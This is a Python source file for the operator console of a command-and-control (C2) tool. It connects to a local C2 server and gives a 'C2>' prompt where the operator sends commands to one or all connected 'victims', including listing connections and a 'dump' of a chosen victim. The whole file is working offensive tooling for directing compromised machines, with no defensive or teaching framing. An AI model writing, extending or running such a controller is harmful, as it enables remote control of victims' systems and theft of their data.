import server; 
from C2 import *
import socket
import sys
import json
import re

cli = socket.socket()
cli.connect(('127.0.0.1', CTRL_PORT))
  
def sendStr(SendStr):
    length = len(SendStr)
    cli.send((length).to_bytes(8,byteorder="big")) # UINT32 4 bytes.
    cli.recv(1) #Sync
    cli.send(SendStr.encode())
    cli.recv(1) #Sync

def recvStr():
    msgSZ = int.from_bytes(cli.recv(8),byteorder='big',signed=False)
    cli.send(b"\x01")
    MSG = cli.recv(msgSZ)
    cli.send(b"\x01")
    return MSG.decode()

def clientInterface():
    jsonObj = {}
    print("Use Target to specify a target: \n\tTarget=*\nThis will send a command to all connected victims.\nSome commands need to be issued to the API host, this can be done utilizing the following syntax: \nTarget="+ str(cli.getpeername()) + "\n\n E.G.\n\tTarget="+str(cli.getpeername()) + " Command=\"List Connections\"\n\tTarget="+str(cli.getpeername()) + " Command={\"subcmd\":\"dump\", \"victim\":\"('<IP ADDR>', <PORT#>)\"}\n\n")
    jsonObj["Target"] = str(cli.getpeername())
    jsonObj["Command"] = "List Connections"
    sendStr(json.dumps(jsonObj))
    print(recvStr())
    while True:
        try:
            Com = input("C2> ")
            if Com =="exit":
                break
            tgt = re.match(r".*Target\s*=\s*(\(.*?\)|\*).*",Com)
            c = re.match(r".*Command\s*=\s*(\".*\"|{.*?}|\S*).*", Com)
            Target = str(tgt.groups()[0])
            snd = ''
            if re.match("{.*}",str(c.groups()[0])):
                Command = str(c.groups()[0])
                snd="{ \"Target\": \""+ Target +"\", \"Command\": " + Command +"}" 
            else:
                Command = str(c.groups()[0].replace("\"", ""))
                snd="{ \"Target\": \""+ Target +"\", \"Command\": \"" + Command +"\"}" 
            sendStr(snd)
           # print(Command)
            #print (command.groups()[0])
            #sendStr(str(Command))
            print(recvStr())
        except Exception as e:
            print(e)
            print("\nInvalid Syntax:\n Use Target to specify a target: \n\tTarget=*\nThis will send a command to all connected victims.\nSome commands need to be issued to the API host, this can be done utilizing the following syntax: \nTarget="+ str(cli.getpeername()) + "\n\n E.G.\n\tTarget="+str(cli.getpeername()) + " Command=\"List Connections\"\n\tTarget="+str(cli.getpeername()) + " Command={\"subcmd\":\"dump\", \"victim\":\"('<IP ADDR>', <PORT#>)\"}\n\n")
    
    cli.close()

if __name__ == '__main__':
    clientInterface()
